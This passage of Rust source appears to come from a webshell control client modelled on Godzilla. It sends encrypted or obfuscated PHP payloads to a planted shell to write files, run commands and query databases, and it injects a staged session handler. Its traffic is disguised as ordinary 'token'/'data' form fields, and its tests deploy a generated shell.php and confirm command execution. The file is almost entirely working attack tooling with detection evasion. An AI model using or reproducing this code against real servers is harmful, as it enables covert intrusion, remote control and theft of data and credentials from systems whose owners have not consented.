        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_chunk", php.encoder)?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$off={off};$mode=($off>0&&@file_exists($p))?'r+b':'w+b';$f=@fopen($p,$mode);if($f===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}\n$ok=(@fseek($f,$off)>=0);if($ok){{@fwrite($f,$d);}}@fclose($f);if(!$ok){{$__r=array('ok'=>false,'error'=>'写入文件失败（偏移无效）');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>strlen($d)));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_chunk", php.encoder)?;
        Ok(())
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_db_probe(php, connection, settings);
        }
        let driver = connection.driver.clone();
        let dsn = build_dsn(connection, false)?;
        let list_dbs = match driver.as_str() {
            "mysql" => "SHOW DATABASES".to_string(),
            "pgsql" => "SELECT datname FROM pg_database".to_string(),
            _ => String::new(),
        };
        let code = Self::build_code(
            DB_PROBE_CODE,
            &[
                ("PARAM_K", encoder_form_key(php.encoder)),
                ("PWD", &php.password),
                ("DSN", &B64.encode(dsn.as_bytes())),
                ("USER", &B64.encode(conn_user(connection))),
                ("PASS", &B64.encode(conn_pass(connection))),
                ("LIST_DBS", &B64.encode(list_dbs.as_bytes())),
                ("DBNAME", &B64.encode(conn_dbname(connection))),
                ("DRIVER", &driver),
            ],
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_probe", php.encoder)?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver,
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        if is_session(php) {
            return self.session_db_query(php, connection, sql, settings);
        }
        let dsn = build_dsn(connection, true)?;
        let code = Self::build_code(
            DB_QUERY_CODE,
            &[
                ("PARAM_K", encoder_form_key(php.encoder)),
                ("PWD", &php.password),
                ("DSN", &B64.encode(dsn.as_bytes())),
                ("USER", &B64.encode(conn_user(connection))),
                ("PASS", &B64.encode(conn_pass(connection))),
                ("SQL", &B64.encode(sql.as_bytes())),
            ],
        );
        let start = Instant::now();
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_query", php.encoder)?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|row| {
                        row.as_array()
                            .map(|cells| {
                                cells
                                    .iter()
                                    .map(|cell| {
                                        if cell.is_null() {
                                            None
                                        } else {
                                            Some(cell.as_str().unwrap_or("").to_string())
                                        }
                                    })
                                    .collect()
                            })
                            .unwrap_or_default()
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);

        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms,
        })
    }
}

/// 编码器的密码参数名（业务伪装模板为 token）。
fn encoder_form_key(encoder: &dyn PayloadEncoder) -> &'static str {
    let (key_param, _) = encoder.form_params();
    key_param
}

/// 校验驱动白名单并构造 PDO DSN。
/// `use_db` 为 true 时把 dbname 并入 DSN（查询语句需要选定数据库）。
fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, ProtocolError> {
    if !DB_DRIVERS.contains(&connection.driver.as_str()) {
        return Err(ProtocolError::NotSupported(format!(
            "不支持的数据库驱动：{}（支持 mysql / pgsql / sqlite）",
            connection.driver
        )));
    }
    let host = connection.host.as_deref().unwrap_or("");
    let port = connection.port.unwrap_or_else(|| {
        if connection.driver == "pgsql" { 5432 } else { 3306 }
    });
    let dbname = connection.dbname.as_deref().unwrap_or("");
    match connection.driver.as_str() {
        "sqlite" => {
            if dbname.is_empty() {
                return Err(ProtocolError::ServerError(
                    "SQLite 模式需要在「数据库」字段填写目标文件路径".into(),
                ));
            }
            Ok(format!("sqlite:{dbname}"))
        }
        "mysql" => {
            let mut dsn = format!("mysql:host={host};port={port};charset=utf8mb4");
            if use_db && !dbname.is_empty() {
                dsn.push_str(&format!(";dbname={dbname}"));
            }
            Ok(dsn)
        }
        _ => {
            let db = if dbname.is_empty() { "postgres" } else { dbname };
            Ok(format!("pgsql:host={host};port={port};dbname={db}"))
        }
    }
}

// ---------------------------------------------------------------------------
// Godzilla 分阶段载荷（xor_session）客户端通道
// ---------------------------------------------------------------------------

/// 是否启用分发通道（分阶段载荷 session 模式 或 NATIVE 内置分发）。
/// 自加密编码器本身即分阶段会话形态（密钥内嵌 + DswSesInit 注入），恒走会话通道。
fn always_session(encoder_id: &str) -> bool {
    matches!(encoder_id, "aes128_ecb" | "aes128_cbc" | "chacha20" | "rabbit")
}

fn is_session(php: &PhpSession) -> bool {
    php.session_mode || is_native(php) || always_session(php.encoder.id())
}

/// JSON 字符串值转义。
fn json_str(value: &str) -> String {
    value.replace('\\', "\\\\").replace('"', "\\\"")
}

/// 发送一次 body 直传请求（密文），返回 XOR 解密后的明文响应。
fn session_post(
    php: &PhpSession,
    body: String,
    settings: &AppSettings,
) -> Result<Vec<u8>, ProtocolError> {
    let response = php
        .client
        .post(&php.endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send()
        .map_err(|error| ProtocolError::Network(error.to_string()))?;
    if !response.status().is_success() {
        return Err(ProtocolError::HttpStatus(
            response.status().as_u16(),
            response.status().canonical_reason().unwrap_or("").to_string(),
        ));
    }
    let bytes = response
        .bytes()
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
    if bytes.len() > max_bytes as usize {
        return Err(ProtocolError::ParseError(format!(
            "响应超过大小上限（{}MB）",
            settings.max_file_size_mb
        )));
    }
    // 响应为编码器密文（base64 文本），按编码器解密
    let text = String::from_utf8_lossy(&bytes);
    php.encoder.decode(&text, &php.password)
}

/// 确保处理器代码已注入服务端 session（幂等：已初始化则跳过）。
fn ensure_session_init(php: &PhpSession, settings: &AppSettings) -> Result<(), ProtocolError> {
    let mut initialized = php
        .initialized
        .lock()
        .map_err(|_| ProtocolError::ParseError("会话状态锁异常".to_string()))?;
    if *initialized {
        return Ok(());
    }
    let code = dosword_sdk::encoder::session_handler_code();
    let payload = php.encoder.encode(code, &php.password);
    if php.encoder.id().contains("chacha") {
        eprintln!("[init] payload head: {}", &payload[..payload.len().min(40)]);
    }
    let plain = session_post(php, payload, settings)?;
    let text = String::from_utf8_lossy(&plain);
    if !text.contains("ok") {
        return Err(ProtocolError::ServerError(format!(
            "分阶段载荷初始化失败：{text}"
        )));
    }
    *initialized = true;
    Ok(())
}

/// 调用一次处理器操作：参数 JSON（XOR 加密）-> 解密响应 -> nonce 帧解析。
fn session_call(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    ensure_session_init(php, settings)?;
    let nonce = random_nonce();
    let mut request = format!("{{\"a\":\"{action}\",\"n\":\"{nonce}\"");
    for (key, value) in params {
        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
    }
    request.push('}');

    let payload = php.encoder.encode(&request, &php.password);
    let plain = session_post(php, payload, settings)?;
    let text = String::from_utf8_lossy(&plain);

    // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
    let start = text.find(&nonce).ok_or_else(|| {
        ProtocolError::ParseError(format!("响应中未找到协议帧（{text}）"))
    })?;
    let tail = &text[start + nonce.len()..];
    let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
        "协议帧不完整".to_string(),
    ))?;
    let payload_b64 = &tail[..end];
    let decoded = B64
        .decode(payload_b64)
        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
    let value: Value = serde_json::from_slice(&decoded)
        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// NATIVE 编码器通道：POST formData（编码器加密的参数 JSON）+ 自定义头鉴权，
/// 响应为 JSON{data: 编码器密文}，解密后得到结果 JSON。
fn native_call(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    let mut request = format!("{{\"a\":\"{action}\"");
    for (key, value) in params {
        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
    }
    request.push('}');

    let payload = php.encoder.encode(&request, &php.password);
    // base64 载荷可能含 +/=，必须 URL 编码（否则 PHP 表单解析时 + 转空格损坏密文）
    let body = url::form_urlencoded::Serializer::new(String::new())
        .append_pair("formData", &payload)
        .finish();
    let token = &dosword_sdk::encoder::md5_hex(&php.password)[..16];
    let response = php
        .client
        .post(&php.endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("X-Debug-Key", token)
        .body(body)
        .send()
        .map_err(|error| ProtocolError::Network(error.to_string()))?;
    if !response.status().is_success() {
        return Err(ProtocolError::HttpStatus(
            response.status().as_u16(),
            response.status().canonical_reason().unwrap_or("").to_string(),
        ));
    }
    let bytes = response
        .bytes()
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
    if bytes.len() > max_bytes as usize {
        return Err(ProtocolError::ParseError(format!(
            "响应超过大小上限（{}MB）",
            settings.max_file_size_mb
        )));
    }
    let text = String::from_utf8_lossy(&bytes);
    let outer: Value = serde_json::from_str(&text)
        .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".to_string()))?;
    let data = outer
        .get("data")
        .and_then(|v| v.as_str())
        .ok_or_else(|| ProtocolError::ParseError("响应缺少 data 字段".to_string()))?;
    let plain = php.encoder.decode(data, &php.password)?;
    let value: Value = serde_json::from_slice(&plain)
        .map_err(|_| ProtocolError::ParseError("响应内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// 是否 NATIVE 分发编码器。
fn is_native(php: &PhpSession) -> bool {
    php.encoder.id().starts_with("native")
}

/// 统一操作分发：NATIVE 走内置功能调用（无 init），其余走分阶段载荷。
fn dispatch(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    if is_native(php) {
        native_call(php, action, params, settings)
    } else {
        session_call(php, action, params, settings)
    }
}

fn conn_json(connection: &DbConnection) -> String {
    serde_json::to_string(connection).unwrap_or_else(|_| "{}".to_string())
}

fn conn_user(connection: &DbConnection) -> String {    connection.username.as_deref().unwrap_or("").to_string()
}

fn conn_pass(connection: &DbConnection) -> String {
    connection.password.as_deref().unwrap_or("").to_string()
}

fn conn_dbname(connection: &DbConnection) -> String {
    connection.dbname.as_deref().unwrap_or("").to_string()
}

// ---------------------------------------------------------------------------
// 测试
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    use serde_json::json;

    use super::*;
    use dosword_sdk::encoder::md5_hex;
    use dosword_sdk::domain::ShellProfile;

    fn settings() -> AppSettings {
        AppSettings {
            http_enabled: true,
            default_timeout_secs: 5,
            proxy: None,
            max_file_size_mb: 32,
        }
    }

    fn profile(endpoint: &str) -> ShellProfile {
        ShellProfile {
            id: "test".into(),
            workspace_id: "ws".into(),
            name: "t".into(),
            endpoint: endpoint.into(),
            runtime: "php".into(),
            protocol_id: PHP_PROTOCOL_ID.into(),
            status: "unknown".into(),
            last_connected_at: None,
            created_at: "2026-01-01".into(),
            password: "secret".into(),
            protocol_params: "{}".into(),
            authorization_ack: true,
            tags: vec![],
        }
    }

    /// 起一个假 PHP 服务器：解析收到的 `k`/`x` 参数，把 (code, k) 通过 channel 上报，
    /// 从代码中提取 nonce，然后用传入的 `respond` 生成 JSON data 包裹进该 nonce 帧回送
    /// （模拟真实 stub 的 echo 行为）。若 `respond` 返回 `None`，则回送明文 AUTH_FAIL。
    fn spawn_fake_server(
        respond: impl Fn(String, String) -> Option<Value> + Send + 'static,
    ) -> (String, std::sync::mpsc::Receiver<(String, String)>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut buf = Vec::new();
                let mut temp = [0u8; 8192];
                loop {
                    match stream.read(&mut temp) {
                        Ok(0) => break,
                        Ok(n) => {
                            buf.extend_from_slice(&temp[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
                let request = String::from_utf8_lossy(&buf);
                let body_start = request.find("\r\n\r\n").map(|i| i + 4).unwrap_or(request.len());
                let body = &request[body_start.min(request.len())..];

                let params: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
                    .map(|(k, v)| (k.into_owned(), v.into_owned()))
                    .collect();
                // 支持标准参数（k/x）与业务伪装参数（token/data）
                let param = |name: &str| {
                    params
                        .iter()
                        .find(|(key, _)| key == name)
                        .map(|(_, v)| v.clone())
                        .unwrap_or_default()
                };
                let k = {
                    let k = param("k");
                    let token = param("token");
                    if !k.is_empty() { k } else { token }
                };
                let x = {
                    let x = param("x");
                    let data = param("data");
                    if !x.is_empty() {
                        x
                    } else if !data.is_empty() {
                        data
                    } else if !body.is_empty() {
                        // body 直传模式（php_stream）：整个请求体即载荷
                        body.to_string()
                    } else {
                        String::new()
                    }
                };
                let code = {
                    // 支持多种编码：裸 base64 / XOR / AES-128-ECB / CHAR / OBFUSCATE
                    // （CHAR/OBFUSCATE 不经 base64，stub 直接 eval，先检查原文）
                    if x.contains("array_map('chr',array(") {
                        let numbers = x.rsplit("array(").next().unwrap_or("");
                        let restored: Vec<u8> = numbers
                            .split(')')
                            .next()
                            .unwrap_or("")
                            .split(',')
                            .filter_map(|item| item.trim().parse::<u8>().ok())
                            .collect();
                        String::from_utf8_lossy(&restored).to_string()
                    } else if x.contains("strrev('") {
                        let reversed = x
                            .split("strrev('")
                            .nth(1)
                            .and_then(|part| part.split("')").next())
                            .unwrap_or("");
                        let b64: String = reversed.chars().rev().collect();
                        let restored = B64.decode(&b64).unwrap_or_default();
                        String::from_utf8_lossy(&restored).to_string()
                    } else {
                        let raw = B64.decode(&x).unwrap_or_default();
                        // 8 字节连续特征串，XOR/AES 密文命中概率可忽略
                        let is_plain = raw.windows(8).any(|w| w == b"@ini_set");
                        if is_plain {
                            String::from_utf8_lossy(&raw).to_string()
                        } else {
                            // XOR
                            let key = md5_hex("secret").into_bytes();
                            let mut restored: Vec<u8> = raw
                                .iter()
                                .enumerate()
                                .map(|(index, byte)| byte ^ key[index % key.len()])
                                .collect();
                            if !restored.windows(8).any(|w| w == b"@ini_set") {
                                // AES-128-ECB
                                restored = dosword_sdk::encoder::aes_ecb_decrypt(
                                    &raw,
                                    &dosword_sdk::encoder::aes_key("secret"),
                                )
                                .unwrap_or_default();
                            }
                            String::from_utf8_lossy(&restored).to_string()
                        }
                    }
                };
                let _ = tx.send((k.clone(), code.clone()));

                // 从代码中提取 `echo '{nonce}'` 帧标记
                let nonce = code
                    .split("echo '")
                    .nth(1)
                    .and_then(|part| part.split('\'').next())
                    .unwrap_or("abababab")
                    .to_string();

                let body = match respond(code, k) {
                    Some(data) => {
                        format!("{}{}{}", nonce, B64.encode(json!(data).to_string()), nonce)
                    }
                    None => "AUTH_FAIL".to_string(),
                };
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
                let _ = stream.flush();
            }
        });
        (format!("http://{addr}"), rx)
    }

    #[test]
    fn real_php_all_encoders_round_trip() {
        // 每个编码器的生成 stub 都做真实执行验证（防止模板双重调用等 bug 漏网）
        let encoders = [
            "native", "native_aes_ecb", "native_aes_cbc", "native_des",
            "aes128_ecb", "aes128_cbc", "chacha20", "rabbit",
        ];
        let settings = settings();
        for encoder_id in encoders {
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false) else {
                eprintln!("跳过 {encoder_id}：未检测到 php 可执行文件");
                continue;
            };
            let mut profile = profile(&url);
            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            let result = (|| -> Result<String, ProtocolError> {
                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
                let output = PhpProtocol.execute_command(session.as_ref(), "printf enc-ok", &settings)?;
                Ok(output.stdout)
            })();
            let _ = child.kill();
            let _ = child.wait();
            let stdout = result.unwrap_or_else(|error| {
                let _ = std::fs::copy(
                    dir.join("shell.php"),
                    std::env::temp_dir().join(format!("failed_{encoder_id}.php")),
                );
                panic!("{encoder_id} 真实执行应成功：{error}");
            });
            let _ = std::fs::remove_dir_all(&dir);
            assert_eq!(stdout.trim(), "enc-ok", "{encoder_id} 输出不符");
        }
    }

    #[test]
    fn real_php_session_variants_round_trip() {
        // Godzilla 分阶段载荷应用到所有编码器：每个编码器以 session 模式真实往返
        let encoders = [
            "native", "native_aes_ecb", "native_aes_cbc", "native_des",
            "aes128_ecb", "aes128_cbc", "chacha20", "rabbit",
        ];
        let settings = settings();
        for encoder_id in encoders {
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", true) else {
                eprintln!("跳过 {encoder_id} session：未检测到 php");
                continue;
            };
            let mut profile = profile(&url);
            // xor_session 编码器本身即 session；其余通过 protocol_params 开启
            if encoder_id == "xor_session" {
                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            } else {
                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}","session":true}}"#);
            }
            let result = (|| -> Result<String, ProtocolError> {
                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
                let output = PhpProtocol.execute_command(session.as_ref(), "printf sess-ok", &settings)?;
                Ok(output.stdout)
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            let stdout = result.unwrap_or_else(|error| panic!("{encoder_id} session 真实执行应成功：{error}"));
            assert_eq!(stdout.trim(), "sess-ok", "{encoder_id} session 输出不符");
        }
    }

    // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---

    /// 在本机临时目录写入指定编码器生成的 stub 并起 `php -S`，
    /// 返回 (endpoint, 临时目录, 进程)。若无 php 可执行则返回 None（跳过测试）。
    /// body 模式编码器（php_stream）自动加 `allow_url_include=1`。
    fn spawn_php_server_with(
        encoder_id: &str,
        password: &str,
        session: bool,
    ) -> Option<(String, std::path::PathBuf, std::process::Child)> {
        let php = std::process::Command::new("php").arg("-v").output().ok()?;
        if !php.status.success() {
            return None;
        }
        let encoder = dosword_sdk::EncoderRegistry::global().get(encoder_id)?;
        let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).ok()?;
        // 部署 SDK 生成的 stub（顺带验证生成器产物的真实可运行性）
        let stub = if session {
            encoder.stub_session("php", password).ok()?
        } else {
            encoder.stub("php", password).ok()?
        };
        std::fs::write(dir.join("shell.php"), stub).ok()?;
        std::fs::create_dir_all(dir.join("www")).ok()?;
        std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;

        let port = {
            // 取一个空闲端口
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let mut command = std::process::Command::new("php");
        if encoder_id == "php_stream" {
            // 仅 include 流方案需要 allow_url_include；xor_body 用 file_get_contents 无需
            command.arg("-d").arg("allow_url_include=1");
        }
        if session || encoder_id == "xor_session" {
            // 分阶段载荷依赖 session：显式指定可写目录
            command
                .arg("-d")
                .arg(format!("session.save_path={}", dir.display()))
                .arg("-d")
                .arg("session.use_cookies=1");
        }
        let child = command
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::from(
                std::fs::File::create(std::env::temp_dir().join("srv.log")).ok()?,
            ))
            .spawn()
            .ok()?;
        // 等待服务器就绪
        let url = format!("http://127.0.0.1:{port}/shell.php");
        for _ in 0..50 {
            if std::net::TcpStream::connect(format!("127.0.0.1:{port}")).is_ok() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        Some((url, dir, child))
    }

    fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
        spawn_php_server_with("base64", "secret", false)
    }
}
